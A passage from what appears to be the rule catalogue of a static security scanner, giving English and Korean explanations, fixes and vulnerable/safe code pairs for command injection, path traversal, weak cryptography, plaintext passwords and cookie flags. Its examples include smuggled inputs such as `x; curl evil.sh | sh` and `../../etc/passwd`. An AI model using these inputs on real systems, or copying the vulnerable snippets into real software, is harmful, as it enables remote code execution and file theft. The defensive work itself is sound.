      cert: [{ kind: "via-cwe", id: "IDS07-J", cwe: "CWE-78" }],
    },
    rationale: {
      en: "A command string built from request data and run through a shell (`exec`, `execSync`, or `spawn` with `shell: true`) lets an attacker append commands with `;`, `&&`, `|` or `$(...)`. A file name such as `a; curl evil.sh | sh` then runs with the privileges of the server process. PGARD trusts `shell-quote`'s `quote()` only from 1.7.3 on (CVE-2021-42740) and does not read your lockfile, so check the version.",
      ko: "요청 데이터로 만든 명령 문자열을 셸을 통해 실행하면(`exec`, `execSync`, `shell: true`인 `spawn`) 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙일 수 있습니다. 예를 들어 파일 이름이 `a; curl evil.sh | sh`이면 서버 프로세스의 권한으로 실행됩니다. PGARD는 `shell-quote`의 `quote()`를 1.7.3 이상에서만 안전하다고 보며(CVE-2021-42740) 잠금 파일은 읽지 않으니 버전을 확인하세요.",
    },
    remediation: {
      en: "Do not use a shell. Call `execFile('git', ['log', '--end-of-options', ref, '--'])` or `spawn` with an argument array, so each argument is passed as-is and never parsed by a shell. Validate arguments against an allowlist, and tell the program where options end (`--end-of-options` for git 2.24+, or `--` for programs that support it) so a user value cannot be read as an option.",
      ko: "셸을 쓰지 마세요. `execFile('git', ['log', '--end-of-options', ref, '--'])`나 인자 배열을 쓰는 `spawn`을 호출하면 각 인자가 셸의 해석 없이 그대로 전달됩니다. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 지원하는 프로그램은 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "exec(`git log ${ref}`);",
        safe: "execFile('git', ['log', '--end-of-options', ref, '--']);",
      },
    ],
  },
  {
    id: "PG-CMD-002",
    title: "Go exec.Command with a shell or dynamic program",
    category: "command_execution",
    defaultSeverity: "high",
    scope: "code",
    languages: ["go"],
    standards: {
      owasp: ["A05:2025"],
      cwe: ["CWE-78"],
      cert: [{ kind: "via-cwe", id: "IDS07-J", cwe: "CWE-78" }],
    },
    rationale: {
      en: '`exec.Command("sh", "-c", ...)` with a string built from request data lets an attacker append commands with `;`, `&&` or `$(...)`. A program name taken from input lets them run any binary on the host. Either way the command runs with the server\'s privileges.',
      ko: '요청 데이터로 만든 문자열을 `exec.Command("sh", "-c", ...)`에 넘기면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙일 수 있습니다. 프로그램 이름을 입력에서 받으면 호스트의 어떤 실행 파일이든 실행시킬 수 있습니다. 어느 쪽이든 명령은 서버의 권한으로 실행됩니다.',
    },
    remediation: {
      en: 'Call the program directly with a fixed name and separate arguments: `exec.Command("git", "log", "--end-of-options", ref, "--")`. Go passes each argument without a shell. Never take the program name from input, validate arguments against an allowlist, and tell the program where options end (`--end-of-options` for git 2.24+, or `--` where supported) so a user value cannot be read as an option.',
      ko: '고정된 프로그램 이름과 분리된 인자로 직접 호출하세요: `exec.Command("git", "log", "--end-of-options", ref, "--")`. Go는 각 인자를 셸 없이 전달합니다. 프로그램 이름을 입력에서 받지 말고, 인자는 허용 목록(allowlist)으로 검증하며, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 지원하는 곳에서는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요.',
    },
    examples: [
      {
        language: "go",
        vulnerable: 'exec.Command("sh", "-c", "git log "+ref).Run()',
        safe: 'exec.Command("git", "log", "--end-of-options", ref, "--").Run()',
      },
    ],
  },
  {
    id: "PG-CMD-003",
    title:
      "OS command built from dynamic strings in Java/Kotlin (Runtime.exec, ProcessBuilder, Commons Exec)",
    category: "command_execution",
    defaultSeverity: "high",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [{ kind: "direct", id: "IDS07-J" }] },
    rationale: {
      en: 'Request data (a Spring `@RequestParam`, `request.getParameter()`, a Ktor `call.parameters` value) in the string for `Runtime.exec(String)`, in the script of `sh -c`, `bash -c` or `cmd /c`, or in `CommandLine.parse(...)` lets an attacker append commands with `;`, `&&` or `$(...)` and run them as the server. In a fixed program\'s argument list (`new ProcessBuilder("git", "log", ref)`) there is no shell, but a value like `--output=out.txt` is still read as an option (argument injection).',
      ko: '요청 데이터(Spring `@RequestParam`, `request.getParameter()`, Ktor `call.parameters` 값)가 `Runtime.exec(String)`에 넘기는 명령 문자열, `sh -c`·`bash -c`·`cmd /c`·`powershell -Command`의 스크립트, `CommandLine.parse(...)`에 들어가면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙여 서버의 권한으로 실행시킬 수 있습니다. 프로그램이 고정된 인자 목록(`new ProcessBuilder("git", "log", ref)`)에서는 셸이 없지만, `--output=out.txt` 같은 값이 옵션으로 해석됩니다(인자 주입).',
    },
    remediation: {
      en: 'Do not build a command string. Call the program directly with a fixed name and one argument per value: `new ProcessBuilder("git", "log", "--end-of-options", ref, "--")`, `Runtime.exec(String[])`, `CommandLine.addArgument(value)`; never `sh -c` with input. Check each argument against an allowlist and mark where options end (`--end-of-options` for git 2.24+, or `--`) so a user value is not read as an option. A Java library (zip, image scaling, DNS) avoids the process altogether.',
      ko: '명령 문자열을 만들지 마세요. 고정된 프로그램 이름과 값마다 하나의 인자로 직접 호출합니다: `new ProcessBuilder("git", "log", "--end-of-options", ref, "--")`, `Runtime.exec(String[])`, `CommandLine.addArgument(value)`. 입력을 넣은 `sh -c`는 쓰지 마세요. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 또는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요. 압축, 이미지 축소, DNS 조회 같은 작업은 Java 라이브러리를 쓰면 프로세스 실행 자체를 피할 수 있습니다.',
    },
    examples: [
      {
        language: "java",
        vulnerable: 'Runtime.getRuntime().exec("ping -c 1 " + host);',
        safe: 'if (!host.matches("[A-Za-z0-9.-]+")) throw new IllegalArgumentException("host");\nnew ProcessBuilder("ping", "-c", "1", host).start();',
        note: {
          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
        },
      },
      {
        language: "kotlin",
        vulnerable: 'ProcessBuilder("sh", "-c", "convert $file out.png").start()',
        safe: 'ProcessBuilder("convert", "--", file, "out.png").start()',
      },
    ],
  },
  {
    id: "PG-CMD-004",
    title: "OS command built from dynamic strings in Python (os.system, subprocess, os.popen)",
    category: "command_execution",
    defaultSeverity: "high",
    scope: "code",
    languages: ["python"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [] },
    rationale: {
      en: "Request data (a Flask `request.args`, a Django `request.GET`, a FastAPI route parameter) in the string for `os.system()`, `os.popen()`, `subprocess.*(..., shell=True)` or the script of `sh -c` lets an attacker append commands with `;`, `&&` or `$(...)` and run them as the server. As the program of a list it chooses what runs. In a fixed program's argument list there is no shell, but a value like `--output=out.txt` is still read as an option (argument injection).",
      ko: "요청 데이터(Flask `request.args`, Django `request.GET`, FastAPI 라우트 매개변수)가 `os.system()`, `os.popen()`, `subprocess.*(..., shell=True)`의 명령 문자열이나 `sh -c`의 스크립트에 들어가면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙여 서버의 권한으로 실행시킬 수 있습니다. 리스트의 프로그램 자리에 들어가면 무엇이 실행될지 공격자가 정합니다. 프로그램이 고정된 인자 리스트에서는 셸이 없지만, `--output=out.txt` 같은 값이 옵션으로 해석됩니다(인자 주입).",
    },
    remediation: {
      en: "Do not build a command string. Call the program directly with a fixed name and one list item per value, without `shell=True`: `subprocess.run(['git', 'log', '--end-of-options', ref, '--'], check=True)`. Never put input in the script of `sh -c`. Check each argument against an allowlist and mark where options end (`--end-of-options` for git 2.24+, or `--`) so a user value is not read as an option. A Python library (zipfile, Pillow, socket.gethostbyname) avoids the process altogether.",
      ko: "명령 문자열을 만들지 마세요. `shell=True` 없이 고정된 프로그램 이름과 값마다 하나의 리스트 항목으로 직접 호출합니다: `subprocess.run(['git', 'log', '--end-of-options', ref, '--'], check=True)`. 입력을 넣은 `sh -c`는 쓰지 마세요. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 또는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요. 압축(zipfile), 이미지 처리(Pillow), DNS 조회(socket.gethostbyname) 같은 작업은 Python 라이브러리를 쓰면 프로세스 실행 자체를 피할 수 있습니다.",
    },
    examples: [
      {
        language: "python",
        vulnerable: 'os.system("ping -c 1 " + host)',
        safe: 'if not re.fullmatch(r"[A-Za-z0-9.-]+", host):\n    abort(400)\nsubprocess.run(["ping", "-c", "1", host], check=True)',
        note: {
          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
        },
      },
      {
        language: "python",
        vulnerable: 'subprocess.run(f"gzip -k {name}", shell=True)',
        safe: 'subprocess.run(["gzip", "-k", "--", name], check=True)',
      },
    ],
  },
  {
    id: "PG-CMD-005",
    title:
      "OS command built from dynamic strings in PHP (exec, system, shell_exec, backticks, Symfony Process)",
    category: "command_execution",
    defaultSeverity: "high",
    scope: "code",
    languages: ["php"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [] },
    rationale: {
      en: "Request data in the string passed to `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, a backtick command or Symfony `Process::fromShellCommandline` is read by a shell, so an attacker can append commands with `;`, `&&`, `|` or `$(...)` and run them as the web server's user. `escapeshellarg` quotes one argument but not an option-like value or a program name. An argument array with a fixed program starts no shell, but a value like `--output=x` is still read as an option.",
      ko: "`exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, 백틱 명령, Symfony `Process::fromShellCommandline`에 넘기는 문자열에 요청 데이터가 들어가면 셸이 해석하므로, 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙여 웹 서버 사용자 권한으로 실행할 수 있습니다. `escapeshellarg`는 인자 하나만 따옴표로 감싸며 옵션처럼 보이는 값이나 프로그램 이름은 막지 못합니다. 프로그램이 고정된 인자 배열은 셸을 시작하지 않지만 `--output=x` 같은 값은 여전히 옵션으로 읽힙니다.",
    },
    remediation: {
      en: "Do not build a command string. Pass the program and arguments as an array so no shell is involved: `new Process(['git', 'log', '--end-of-options', $ref, '--'])` or `proc_open([...], $descriptors, $pipes)`. Check each argument against an allowlist (`preg_match('/^[A-Za-z0-9._-]+$/', $v)` with an early return) and mark where options end (`--`). If a shell string is unavoidable, wrap every value in `escapeshellarg()`. A PHP extension (zip, GD) avoids the process.",
      ko: "명령 문자열을 만들지 마세요. 프로그램과 인자를 배열로 넘기면 셸이 개입하지 않습니다: `new Process(['git', 'log', '--end-of-options', $ref, '--'])` 또는 `proc_open([...], $descriptors, $pipes)`. 인자는 허용 목록(allowlist)으로 검증하고(`preg_match('/^[A-Za-z0-9._-]+$/', $v)`로 확인한 뒤 아니면 바로 반환), 옵션이 끝나는 지점(`--`)을 표시하세요. 셸 문자열이 불가피하면 모든 값을 `escapeshellarg()`로 감싸세요. zip, GD 같은 PHP 확장을 쓰면 프로세스 실행을 피할 수 있습니다.",
    },
    examples: [
      {
        language: "php",
        vulnerable: "system(\"ping -c 1 \" . $_GET['host']);",
        safe: "$process = new Process(['ping', '-c', '1', $host]);\n$process->run();",
        note: {
          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
        },
      },
    ],
  },
  {
    id: "PG-PATH-001",
    title: "File path from request input used in file read/download",
    category: "file_handling",
    defaultSeverity: "high",
    scope: "code",
    languages: ["javascript", "typescript", "go"],
    standards: { owasp: ["A01:2025"], cwe: ["CWE-22"], cert: [] },
    rationale: {
      en: "Using a request value as part of a file path lets an attacker send `../../etc/passwd` (or backslash, absolute-path and encoded variants) to read or download files outside the intended directory, such as configuration, keys and source code.",
      ko: "요청 값을 파일 경로의 일부로 쓰면 공격자가 `../../etc/passwd`(또는 역슬래시, 절대 경로, 인코딩된 변형)를 보내 의도한 디렉터리 밖의 파일(설정, 키, 소스 코드 등)을 읽거나 내려받을 수 있습니다.",
    },
    remediation: {
      en: "Prefer an id looked up in a table over a file name. Otherwise reduce the input with `path.basename`, resolve it against a fixed root (`path.resolve(root, name)`), and check that the result starts with the root plus a separator before opening it. In Go, use `filepath.Join` with the same prefix check, or `os.Root` (Go 1.24+).",
      ko: "파일 이름 대신 표에서 찾는 id를 쓰는 편이 좋습니다. 그렇지 않다면 입력을 `path.basename`으로 줄이고, 고정된 루트를 기준으로 해석(`path.resolve(root, name)`)한 뒤 파일을 열기 전에 결과가 루트와 구분자로 시작하는지 확인하세요. Go에서는 `filepath.Join`과 같은 접두사 검사를 하거나 `os.Root`(Go 1.24 이상)를 사용하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "res.sendFile(path.join(UPLOADS, req.query.name));",
        safe: "// once, at startup: const UPLOADS = path.resolve('uploads');\nconst file = path.resolve(UPLOADS, path.basename(req.query.name));\nif (!file.startsWith(UPLOADS + path.sep)) return res.sendStatus(400);\nres.sendFile(file);",
      },
    ],
  },
  {
    id: "PG-PATH-002",
    title:
      "File path from request input or an archive entry used in Java/Kotlin file access (path traversal, zip slip)",
    category: "file_handling",
    defaultSeverity: "high",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: {
      owasp: ["A01:2025"],
      cwe: ["CWE-22"],
      cert: [
        { kind: "direct", id: "FIO16-J", cause: "other-than-archive-entry" },
        { kind: "direct", id: "IDS04-J", cause: "archive-entry" },
      ],
    },
    rationale: {
      en: "Using request data (`@RequestParam`, `request.getParameter()`, `MultipartFile.getOriginalFilename()`, a Ktor `call.parameters` value) or `ZipEntry.getName()` as part of a path in `new File(...)`, `Paths.get(...)`, `Path.resolve(...)`, `Files.*` or `FileInputStream` lets an attacker send `../../etc/passwd` to read, overwrite or delete files outside the intended directory. An archive entry named `../../app/run.sh` does the same when it is extracted (zip slip).",
      ko: "요청 데이터(`@RequestParam`, `request.getParameter()`, `MultipartFile.getOriginalFilename()`, Ktor `call.parameters` 값)나 `ZipEntry.getName()`을 `new File(...)`, `Paths.get(...)`, `Path.resolve(...)`, `Files.*`, `FileInputStream`의 경로 일부로 쓰면 공격자가 `../../etc/passwd`를 보내 의도한 디렉터리 밖의 파일을 읽거나 덮어쓰거나 지울 수 있습니다. 압축 파일 항목 이름이 `../../app/run.sh`이면 압축을 풀 때 같은 일이 일어납니다(zip slip).",
    },
    remediation: {
      en: "Prefer an id looked up in a table over a file name. Otherwise resolve the input against a fixed base, canonicalize it and check the prefix before using it: `Path p = base.resolve(name).normalize(); if (!p.startsWith(base)) throw ...;` (with `base` already normalized, or use `toRealPath()` to resolve links). `FilenameUtils.getName(name)` or `Paths.get(name).getFileName()` keeps only the last element, but check that it is not `..`. Do the same check on every archive entry name before writing it.",
      ko: "파일 이름 대신 표에서 찾는 id를 쓰는 편이 좋습니다. 그렇지 않다면 입력을 고정된 기준 디렉터리에 대해 해석하고 정규화한 뒤, 사용하기 전에 접두사를 검사하세요: `Path p = base.resolve(name).normalize(); if (!p.startsWith(base)) throw ...;` (`base`는 미리 정규화해 두거나, 링크까지 풀려면 `toRealPath()`를 사용). `FilenameUtils.getName(name)`이나 `Paths.get(name).getFileName()`은 마지막 요소만 남기지만 그 값이 `..`이 아닌지 확인하세요. 압축 파일의 모든 항목 이름도 쓰기 전에 같은 방식으로 검사하세요.",
    },
    examples: [
      {
        language: "java",
        vulnerable: 'Files.readAllBytes(Paths.get("/srv/files", name));',
        safe: 'Path p = BASE.resolve(name).normalize();\nif (!p.startsWith(BASE)) throw new SecurityException("path");\nFiles.readAllBytes(p);',
        note: {
          en: "`name` set to `../../etc/passwd` reads `/etc/passwd` in the first form; the second form rejects it.",
          ko: "`name`이 `../../etc/passwd`이면 첫 번째 코드는 `/etc/passwd`를 읽고, 두 번째 코드는 거부합니다.",
        },
      },
      {
        language: "java",
        vulnerable:
          "File out = new File(dest, entry.getName());\ntry (var fos = new FileOutputStream(out)) { zis.transferTo(fos); }",
        safe: 'File out = new File(dest, entry.getName());\nif (!out.getCanonicalPath().startsWith(dest.getCanonicalPath() + File.separator)) {\n  throw new IOException("zip slip");\n}\ntry (var fos = new FileOutputStream(out)) { zis.transferTo(fos); }',
      },
    ],
  },
  {
    id: "PG-CRYPTO-001",
    title: "Weak hash (MD5/SHA-1) used for passwords",
    category: "cryptography",
    defaultSeverity: "high",
    scope: "code",
    languages: ["javascript", "typescript", "go", "java", "kotlin"],
    standards: {
      owasp: ["A04:2025"],
      cwe: ["CWE-916", "CWE-328"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly; related recommendation: MSC62-J Store passwords using a hash function (recommendations are not linked).",
        ko: "직접 대응하는 CERT 규칙이 없습니다. 관련 권고: MSC62-J Store passwords using a hash function (권고는 연결하지 않습니다).",
      },
    },
    rationale: {
      en: 'MD5 and SHA-1 are fast hashes. After a database leak an attacker can test billions of guesses per second on a GPU, so most passwords are recovered quickly. Both are also broken against collisions. In Java and Kotlin the rule reads `MessageDigest.getInstance("MD5"|"SHA-1")`, Guava `Hashing.md5()` and Commons Codec `DigestUtils.md5Hex` applied to a password-named value; a digest of anything else is not reported.',
      ko: 'MD5와 SHA-1은 빠른 해시입니다. 데이터베이스가 유출되면 공격자가 GPU로 초당 수십억 번의 추측을 시도할 수 있어 대부분의 비밀번호가 빠르게 복구됩니다. 두 알고리즘 모두 충돌에 대해서도 이미 깨졌습니다. Java와 Kotlin에서는 비밀번호 이름의 값에 적용한 `MessageDigest.getInstance("MD5"|"SHA-1")`, Guava `Hashing.md5()`, Commons Codec `DigestUtils.md5Hex`를 읽고, 다른 값의 해시는 보고하지 않습니다.',
    },
    remediation: {
      en: "Hash passwords with a slow, salted algorithm built for that purpose (Argon2id, scrypt or bcrypt), for example `await bcrypt.hash(password, 12)` or `golang.org/x/crypto/bcrypt`; in Java and Kotlin `new BCryptPasswordEncoder().encode(password)`. The library generates the per-user salt. Rehash existing users at their next login.",
      ko: "비밀번호 해시용으로 만들어진 느리고 salt가 적용되는 알고리즘(Argon2id, scrypt, bcrypt)으로 해시하세요. 예: `await bcrypt.hash(password, 12)`, Go는 `golang.org/x/crypto/bcrypt`, Java와 Kotlin은 `new BCryptPasswordEncoder().encode(password)`. 사용자별 salt는 라이브러리가 만듭니다. 기존 사용자는 다음 로그인 때 다시 해시하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "const hash = crypto.createHash('md5').update(password).digest('hex');",
        safe: "const hash = await bcrypt.hash(password, 12);",
      },
      {
        language: "java",
        vulnerable:
          'MessageDigest md = MessageDigest.getInstance("MD5");\nbyte[] hash = md.digest(password.getBytes(StandardCharsets.UTF_8));',
        safe: "String hash = new BCryptPasswordEncoder().encode(password);",
      },
    ],
  },
  {
    id: "PG-CRYPTO-002",
    title: "Hardcoded cryptographic key or signing secret",
    category: "cryptography",
    defaultSeverity: "high",
    scope: "code",
    languages: ["javascript", "typescript", "go", "java", "kotlin"],
    standards: {
      owasp: ["A04:2025", "A07:2025"],
      cwe: ["CWE-321", "CWE-798"],
      cert: [
        { kind: "direct", id: "MSC03-J" },
        { kind: "via-cwe", id: "MSC03-J", cwe: "CWE-798" },
      ],
    },
    rationale: {
      en: "A key or signing secret written in the source is available to everyone who can read the repository, its history, a build artifact or a bundle. With it an attacker can decrypt stored data and forge tokens (for example a JWT signed with a known secret), and the key cannot be changed without a new release. In Java and Kotlin a literal given to `SecretKeySpec`, JJWT `signWith` or Auth0 `HMAC256`, or the literal default of a Spring `@Value` key, is reported.",
      ko: "소스에 적어 둔 키나 서명용 비밀정보는 저장소, 그 이력, 빌드 산출물, 번들을 읽을 수 있는 모든 사람이 가질 수 있습니다. 이를 이용해 공격자는 저장된 데이터를 복호화하고 토큰을 위조할 수 있으며(예: 알려진 비밀정보로 서명한 JWT), 새 릴리스 없이는 키를 바꿀 수도 없습니다. Java와 Kotlin에서는 `SecretKeySpec`, JJWT `signWith`, Auth0 `HMAC256`에 전달되는 리터럴과 Spring `@Value` 키의 리터럴 기본값을 보고합니다.",
    },
    remediation: {
      en: "Load the key at runtime from an environment variable or a secret manager, and generate it with a CSPRNG (`crypto.randomBytes(32)`; Java and Kotlin: `SecureRandom`, no default in `@Value`). Treat the exposed key as compromised: rotate it, since it remains in Git history and old releases, then re-sign tokens and re-encrypt data under the new key.",
      ko: "키는 실행 시점에 환경 변수나 비밀정보 관리 도구(secret manager)에서 불러오고, CSPRNG(`crypto.randomBytes(32)`, Java와 Kotlin은 `SecureRandom`, `@Value`에는 기본값 없음)로 생성하세요. 노출된 키는 Git 이력과 이전 릴리스에 남아 있으므로 유출된 것으로 간주하고 교체(rotate)한 뒤, 새 키로 토큰을 다시 서명하고 데이터를 다시 암호화하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "const token = jwt.sign(payload, 'my-secret-key');",
        safe: "const token = jwt.sign(payload, process.env.JWT_SECRET);",
      },
      {
        language: "java",
        vulnerable:
          'SecretKey key = new SecretKeySpec("my-secret-key-123".getBytes(), "HmacSHA256");',
        safe: 'SecretKey key = new SecretKeySpec(System.getenv("JWT_SECRET").getBytes(), "HmacSHA256");',
      },
    ],
  },
  {
    id: "PG-CRYPTO-003",
    title: "Broken or deprecated cipher, fixed IV or predictable random value",
    category: "cryptography",
    defaultSeverity: "medium",
    scope: "code",
    fixable: true,
    languages: [...JS_TS, "java", "kotlin"],
    standards: {
      owasp: ["A04:2025"],
      cwe: ["CWE-327"],
      cert: [{ kind: "direct", id: "MSC02-J", cause: "weak-random" }],
      noDirectCertOther: {
        en: "No CERT rule maps directly; related recommendation: MSC61-J Do not use insecure or weak cryptographic algorithms (recommendations are not linked).",
        ko: "직접 대응하는 CERT 규칙이 없습니다. 관련 권고: MSC61-J Do not use insecure or weak cryptographic algorithms (권고는 연결하지 않습니다).",
      },
    },
    rationale: {
      en: "Ciphers such as DES, 3DES and RC4, and modes such as ECB, are broken or leak the structure of the plaintext. An attacker who captures the ciphertext may recover data, and without authentication (a GCM tag or a MAC) can also modify it without detection. A predictable random source (`java.util.Random`, `Math.random()`) for a key, IV, salt or token lets an attacker guess it. In Java and Kotlin the rule also reads bare `AES` (ECB), a fixed IV and such random values.",
      ko: "DES, 3DES, RC4 같은 암호나 ECB 같은 모드는 깨졌거나 평문의 구조를 드러냅니다. 암호문을 가로챈 공격자는 데이터를 복구할 수 있고, 인증(GCM 태그나 MAC)이 없으면 탐지되지 않게 변조할 수도 있습니다. 키·IV·salt·토큰에 쓰는 예측 가능한 난수(`java.util.Random`, `Math.random()`)는 공격자가 추측할 수 있습니다. Java와 Kotlin에서는 모드 없는 `AES`(ECB), 고정 IV, 이런 난수 값도 읽습니다.",
    },
    remediation: {
      en: "Use an AEAD cipher: AES-256-GCM through `crypto.createCipheriv('aes-256-gcm', key, iv)`, with a new random 12-byte IV for every message. Store the tag from `getAuthTag()` after encrypting. When decrypting, create the decipher with `{ authTagLength: 16 }` (or check the stored tag is 16 bytes) and call `setAuthTag()` before `final()`, so a truncated tag is rejected. Never reuse an IV with the same key. In Java use `AES/GCM/NoPadding` and `SecureRandom`.",
      ko: "AEAD 암호를 사용하세요. `crypto.createCipheriv('aes-256-gcm', key, iv)`로 AES-256-GCM을 쓰고, 메시지마다 새 무작위 12바이트 IV를 만들며, 암호화한 뒤 `getAuthTag()`로 얻은 태그를 함께 저장하세요. 복호화할 때는 `{ authTagLength: 16 }`으로 decipher를 만들고(또는 저장된 태그가 16바이트인지 확인하고) `final()` 전에 `setAuthTag()`를 호출해 잘린 태그를 거부하세요. 같은 키로 IV를 재사용하지 마세요. Java에서는 `AES/GCM/NoPadding`과 `SecureRandom`을 쓰세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "const cipher = crypto.createCipheriv('des-ede3-cbc', key, iv);",
        safe: "const iv = crypto.randomBytes(12);\nconst cipher = crypto.createCipheriv('aes-256-gcm', key, iv, { authTagLength: 16 });",
      },
      {
        language: "java",
        vulnerable: 'Cipher cipher = Cipher.getInstance("AES");',
        safe: 'byte[] iv = new byte[12];\nnew SecureRandom().nextBytes(iv);\nCipher cipher = Cipher.getInstance("AES/GCM/NoPadding");\ncipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));',
      },
    ],
  },
  {
    id: "PG-AUTH-001",
    title: "Password stored without hashing",
    category: "cryptography",
    defaultSeverity: "high",
    scope: "code",
    languages: [...JS_TS, "java", "kotlin"],
    standards: {
      owasp: ["A06:2025"],
      cwe: ["CWE-256"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly; related recommendation: MSC62-J Store passwords using a hash function (recommendations are not linked).",
        ko: "직접 대응하는 CERT 규칙이 없습니다. 관련 권고: MSC62-J Store passwords using a hash function (권고는 연결하지 않습니다).",
      },
    },
    rationale: {
      en: "A password saved as plain text, or in any reversible form, is exposed in full by any database leak, backup, log or SQL injection. Staff with database access can read it, and every user who reused it elsewhere is at risk too. PGARD also flags password-named values passed to repository or ORM calls without a hash call in the same function, at low confidence when the value is not read from a request. In Java and Kotlin: a password saved without `passwordEncoder.encode`, or `NoOpPasswordEncoder`.",
      ko: "평문이나 되돌릴 수 있는 형태로 저장한 비밀번호는 데이터베이스 유출, 백업, 로그, SQL 인젝션 어느 경우에나 그대로 노출됩니다. 데이터베이스에 접근하는 직원도 읽을 수 있고, 다른 곳에서 같은 비밀번호를 쓰는 사용자도 위험해집니다. PGARD는 같은 함수에 해시 호출 없이 저장소·ORM 호출로 넘어가는 비밀번호 이름의 값도 보고하며, 값이 요청에서 읽은 것이 아니면 낮은 신뢰도로 보고합니다. Java와 Kotlin은 `passwordEncoder.encode` 없이 저장한 비밀번호와 `NoOpPasswordEncoder`입니다.",
    },
    remediation: {
      en: "Never store the password itself. Store a hash from a password hashing function with a per-user salt: Argon2id (preferred), scrypt or bcrypt, for example `await argon2.hash(password)` when the user signs up and `argon2.verify(hash, password)` at login. In Java: `passwordEncoder.encode(password)`.",
      ko: "비밀번호 자체를 저장하지 마세요. 사용자별 salt를 적용한 비밀번호 해시 함수(Argon2id 권장, scrypt, bcrypt)의 결과만 저장하세요. 예: 가입할 때 `await argon2.hash(password)`, 로그인할 때 `argon2.verify(hash, password)`. Java: `passwordEncoder.encode(password)`.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "await User.create({ email, password });",
        safe: "await User.create({ email, passwordHash: await argon2.hash(password) });",
      },
      {
        language: "java",
        vulnerable: "user.setPassword(request.getPassword());\nuserRepository.save(user);",
        safe: "user.setPassword(passwordEncoder.encode(request.getPassword()));\nuserRepository.save(user);",
      },
    ],
  },
  {
    id: "PG-COOKIE-001",
    title: "Session or auth cookie without HttpOnly/Secure/SameSite",
    category: "misconfiguration",
    defaultSeverity: "medium",
    scope: "code",
    fixable: true,
    languages: ["javascript", "typescript", "go", "java", "kotlin"],
    standards: {
      owasp: ["A01:2025", "A02:2025"],
      cwe: ["CWE-1004", "CWE-614", "CWE-1275"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly.",
        ko: "직접 대응하는 CERT 규칙이 없습니다.",
      },
    },
    rationale: {
      en: "A session cookie without HttpOnly can be read by injected script, so XSS becomes session theft. Without Secure it can travel over plain HTTP. Without SameSite other sites can make the browser attach it, enabling CSRF. Only cookies that look like session or auth cookies are judged: a name with sess, sid, token, auth, jwt, login, remember, refresh or access, or a session or token value. Theme or locale cookies are not reported. Also checked in Java, Kotlin and Spring Boot config.",
      ko: "HttpOnly가 없는 세션 쿠키는 주입된 스크립트가 읽을 수 있어 XSS 결함이 세션 탈취로 이어집니다. Secure가 없으면 평문 HTTP로 전송되어 네트워크에서 가로채일 수 있습니다. SameSite가 없으면 브라우저가 다른 사이트가 시작한 요청에도 쿠키를 실을 수 있어 CSRF가 가능해집니다. PGARD는 세션·인증 쿠키처럼 보이는 쿠키만 판단합니다. 이름에 sess, sid, token, auth, jwt, login, remember, refresh, access가 들어가거나 값이 세션·토큰인 경우입니다. 테마나 언어 같은 다른 쿠키는 보고하지 않습니다. Java, Kotlin, Spring Boot 설정도 확인합니다.",
    },
    remediation: {
      en: "Set all three on session and authentication cookies: `res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' })`, or in Go `http.Cookie{HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode}`. Use `strict` when the site is not entered through cross-site links. Secure needs HTTPS, but browsers such as Chrome and Firefox also accept Secure cookies on `http://localhost`, so development there can keep it on. Java: `setHttpOnly(true)` and `setSecure(true)`.",
